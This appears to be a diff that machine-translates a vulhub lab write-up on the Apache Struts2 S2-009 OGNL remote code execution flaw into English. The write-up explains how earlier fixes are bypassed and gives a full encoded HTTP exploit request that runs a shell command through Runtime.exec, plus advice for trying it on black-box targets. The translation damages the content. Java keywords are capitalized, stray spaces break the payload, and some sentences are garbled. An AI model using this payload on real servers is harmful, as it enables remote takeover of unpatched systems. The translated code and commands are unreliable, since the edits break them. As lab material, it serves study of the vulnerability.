@@ -1,57 +1,57 @@
-# S2-009 远程代码执行漏洞
+# S2-009 Remote Code Execution Vulnerability
 
-影响版本: 2.1.0 - 2.3.1.1
+Impact version: 2.1.0 - 2.3.1.1
 
-漏洞详情: http://struts.apache.org/docs/s2-009.html
+Vulnerability details: http://struts.apache.org/docs/s2-009.html
 
-## 测试环境搭建
+## Test environment construction
 
 ```
-docker-compose build
-docker-compose up -d
+Docker-compose build
+Docker-compose up -d
 ```
 
-## 原理
+## Principle
 
-> 前置阅读： 这个漏洞再次来源于s2-003、s2-005。了解该漏洞原理，需要先阅读s2-005的说明：https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md
+> Front reading: This vulnerability is again from s2-003, s2-005. To understand the principle of the vulnerability, you need to read the instructions of s2-005: https://github.com/phith0n/vulhub/blob/master/struts2/s2-005/README.md
 
-参考[Struts2漏洞分析之Ognl表达式特性引发的新思路](https://www.t00ls.net/viewthread.php?tid=21197)，文中说到，该引入ognl的方法不光可能出现在这个漏洞中，也可能出现在其他java应用中。
+Refer to [Struts2 vulnerability analysis of the Ognl expression feature triggered by a new idea] (https://www.t00ls.net/viewthread.php?tid=21197), the text said that the introduction of ognl method may not only appear in this vulnerability It may also appear in other Java applications.
 
-Struts2对s2-003的修复方法是禁止`#`号，于是s2-005通过使用编码`\u0023`或`\43`来绕过；于是Struts2对s2-005的修复方法是禁止`\`等特殊符号，使用户不能提交反斜线。
+Struts2's repair method for s2-003 is to prohibit `#`, so s2-005 is bypassed by using the code `\u0023` or `\43`; then Struts2's repair method for s2-005 is forbidden `\` Special symbols that prevent users from submitting backslashes.
 
-但是，如果当前action中接受了某个参数`example`，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在`example`参数中，然后使用`/helloword.acton?example=<OGNL statement>&(example)('xxx')=1`的方法来执行它，从而绕过官方对`#`、`\`等特殊字符的防御。
+However, if a parameter ʻexample` is accepted in the current action, this parameter will enter the OGNL context. So, we can put the OGNL expression in the `example` parameter and then execute it using `/helloword.acton?example=<OGNL statement>&(example)('xxx')=1` The official defense against special characters such as `#`, `\`.
 
-## Exploit构造
+## Exploit Construction
 
-测试环境是一个struts2的“功能展示”网站`Struts Showcase`，代码很多，我们的目标是去找一个接受了参数，参数类型是string的action。
+The test environment is a struts2 "feature display" website `Struts Showcase`, the code is a lot, our goal is to find an action that accepts the parameter, the parameter type is string.
 
-先对`S2-009.war`进行解压（我用binwalk，其实直接zip就可以），可见源码都在`WEB-INF/src`目录中，我一般找ajax相关的代码，这些代码一般逻辑比较简单。
+First decompress `S2-009.war` (I use binwalk, in fact, direct zip can be), visible source code is in the `WEB-INF/src` directory, I generally look for ajax related code, the general logic comparison of these codes simple.
 
-找到一个`WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java`：
+Find a `WEB-INF/src/java/org/apache/struts2/showcase/ajax/Example5Action.java`:
 
 ```java
-public class Example5Action extends ActionSupport {
+Public class Example5Action extends ActionSupport {
 
-    private static final long serialVersionUID = 2111967621952300611L;
+    Private static final long serialVersionUID = 2111967621952300611L;
 
-    private String name;
-    private Integer age;
+    Private String name;
+    Private Integer age;
 
 
-    public String getName() { return name; }
-    public void setName(String name) { this.name = name; }
+    Public String getName() { return name; }
+    Public void setName(String name) { this.name = name; }
 
-    public Integer getAge() { return age; }
-    public void setAge(Integer age) { this.age = age; }
+    Public Integer getAge() { return age; }
+    Public void setAge(Integer age) { this.age = age; }
 
     @Override
-    public String execute() throws Exception {
-        return SUCCESS;
+    Public String execute() throws Exception {
+        Return SUCCESS;
     }
 }
 ```
 
-代码没有更简单了，其接受了name参数并调用setName将其赋值给私有属性`this.name`，正是符合我们的要求。然后去`WEB-INF/src/java/struts-ajax.xml`看一下URL路由：
+The code is not simpler. It accepts the name parameter and calls setName to assign it to the private property `this.name`, which is in line with our requirements. Then go to `WEB-INF/src/java/struts-ajax.xml` to see the URL routing:
 
 ```xml
 <package name="ajax" extends="struts-default">
@@ -64,10 +64,10 @@ public class Example5Action extends ActionSupport {
 </package>
 ```
 
-`name=example5`，所以访问`http://your-ip:8080/ajax/example5.action`即可访问该控制器。按照原理中说到的方法，将OGNL利用代码放在name参数里，访问该URL：
+`name=example5`, so access the controller by visiting `http://your-ip:8080/ajax/example5.action`. According to the method mentioned in the principle, put the OGNL exploit code in the name parameter and access the URL:
 
 ```
-GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z[%28name%29%28%27meh%27%29]=true HTTP/1.1
+GET /ajax/example5?age=12313&name=%28%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowStaticMethodAccess%22]% 3d+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27touch%20/tmp/success%27%29%29%28meh%29&z [%28name%29%28%27meh%27%29]=true HTTP/1.1
 Host: localhost:8080
 Accept: */*
 Accept-Language: en
@@ -77,8 +77,8 @@ Connection: close
 
 ```
 
-由于该POC没有回显，所以调用的是`touch /tmp/success`命令，查看/tmp目录发现已经成功：
+Since the POC is not echoed, the `touch /tmp/success` command is called, and the /tmp directory is found to have succeeded:
 
 ![](1.png)
 
-黑盒情况下，这个洞也不是限制特别大。只要你在正常业务中找到传参的地方，就用该参数名可以试试。
+In the case of a black box, this hole is not particularly limited. As long as you find the place to pass the parameters in the normal business, you can try this parameter name.
